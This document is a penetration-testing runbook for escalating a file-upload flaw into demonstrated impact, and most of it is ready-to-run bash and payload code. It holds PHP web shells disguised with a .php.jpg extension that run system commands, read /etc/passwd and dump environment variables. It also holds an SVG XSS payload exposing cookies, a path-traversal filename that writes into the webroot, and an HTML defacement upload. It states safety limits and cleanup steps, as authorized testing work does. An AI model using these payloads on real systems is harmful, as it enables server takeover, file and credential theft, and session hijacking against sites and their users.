# File Upload Impact Escalation Runbook

## Purpose
Escalate from "malicious file was accepted" to demonstrable business impact. SAFE commands only — no backdoors left on server, no data destruction.

## Variables
- `$TARGET_URL` — upload endpoint
- `$FILE_URL` — accessible URL of uploaded file
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated session
- `$PAYLOAD_DIR` — `$OUTDIR/payloads`
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/file-upload`

## Impact Categories

### I1 — Remote Code Execution via Uploaded Shell
```bash
cat > "$PAYLOAD_DIR/impact-rce.php.jpg" << 'PHPEOF'
<?php system("whoami;id;uname -a"); ?>
PHPEOF
curl -sk -F "file=@$PAYLOAD_DIR/impact-rce.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" -o /dev/null
curl -sk "$FILE_URL" -o "$EVIDENCE_DIR/impact-rce-output.txt"
cat "$EVIDENCE_DIR/impact-rce-output.txt"
echo "Impact: Arbitrary server-side code execution via uploaded PHP shell"
```

### I2 — Read Sensitive System Files
```bash
cat > "$PAYLOAD_DIR/impact-readfile.php.jpg" << 'PHPEOF'
<?php echo file_get_contents("/etc/passwd"); ?>
PHPEOF
curl -sk -F "file=@$PAYLOAD_DIR/impact-readfile.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" -o /dev/null
curl -sk "$FILE_URL" -o "$EVIDENCE_DIR/impact-passwd-leak.txt"
head -5 "$EVIDENCE_DIR/impact-passwd-leak.txt"
echo "Impact: Arbitrary file read from server filesystem via uploaded PHP payload"
```

### I3 — Server Environment Exposure
```bash
cat > "$PAYLOAD_DIR/impact-env.php.jpg" << 'PHPEOF'
<?php echo "HOSTNAME:".gethostname()."|ENV:".json_encode($_ENV); ?>
PHPEOF
curl -sk -F "file=@$PAYLOAD_DIR/impact-env.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" -o /dev/null
curl -sk "$FILE_URL" -o "$EVIDENCE_DIR/impact-env-output.txt"
cat "$EVIDENCE_DIR/impact-env-output.txt" | head -5
echo "Impact: Server hostname and environment variables exposed"
```

### I4 — SVG XSS Impact (Cookie Theft / Phishing)
```bash
# Create SVG that shows this is exploitable
cat > "$PAYLOAD_DIR/impact-xss.svg" << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    document.write("XSS_CONFIRMED|DOMAIN:"+document.domain+"|COOKIE:"+document.cookie);
  </script>
</svg>
SVGEOF
curl -sk -F "file=@$PAYLOAD_DIR/impact-xss.svg" -b "$COOKIE_JAR" "$TARGET_URL" -o /dev/null
SVG_URL=$(grep -oE '(https?://[^"'\"'']*\.svg)' "$OUTDIR/upload-svg-response.txt" | head -1)
echo "Impact: SVG XSS at $SVG_URL — JavaScript executes in target domain context"
echo "Impact: Can steal cookies, session tokens, perform actions as victim"
```

### I5 — Arbitrary File Write (Overwrite Application Files)
```bash
echo "path-traversal-impact-test" > "$PAYLOAD_DIR/pt-impact.txt"
curl -sk -v -F "filename=../../../var/www/html/writable-test.txt" -F "file=@$PAYLOAD_DIR/pt-impact.txt" -b "$COOKIE_JAR" "$TARGET_URL" > "$EVIDENCE_DIR/impact-path-traversal.txt" 2>&1
echo "Impact: Arbitrary file write to webroot via path traversal in filename"
```

### I6 — Web Application Defacement Potential
```bash
cat > "$PAYLOAD_DIR/deface-demo.html" << 'HTMLEOF'
<h1>Upload Vulnerability Confirmed</h1>
<p>If this page renders, file upload allows HTML injection.</p>
HTMLEOF
curl -sk -F "filename=deface-test.html" -F "file=@$PAYLOAD_DIR/deface-demo.html" -b "$COOKIE_JAR" "$TARGET_URL" -o "$EVIDENCE_DIR/impact-deface-upload.txt"
# Note: do NOT actually check if it overwrites index.html — document as potential
echo "Impact: Attacker could upload .html files to webroot — phishing, defacement, SEO spam"
```

## What Impact Looks Like Per Sub-Type

| Sub-Type | Impact Signal | Severity |
|---|---|---|
| PHP shell upload | Server commands executed, file read | Critical |
| Extension bypass (phtml, php5) | Same as PHP shell — full RCE | Critical |
| SVG XSS | JavaScript runs in app domain, cookie access | High |
| Path traversal in filename | Arbitrary file write, potential config overwrite | Critical |
| HTML upload to webroot | Phishing, defacement, cookie theft via iframe | Medium-High |

## Stop Conditions
- RCE via shell confirmed -> stop (maximum impact)
- SVG XSS confirmed with cookie access in same domain -> stop
- Path traversal to webroot confirmed -> stop
- Do NOT leave persistent backdoors or webshells accessible

## Clean Up After Testing
```bash
# If we can execute code, clean up our test files
cat > "$PAYLOAD_DIR/cleanup.php.jpg" << 'PHPEOF'
<?php unlink(__FILE__); ?>
PHPEOF
curl -sk -F "file=@$PAYLOAD_DIR/cleanup.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" -o /dev/null
curl -sk "$FILE_URL" 2>/dev/null
echo "Attempted cleanup of test shell via self-deleting PHP file"
```

## Next Routing
- Impact demonstrated -> `runbooks/05-evidence-collection.md`
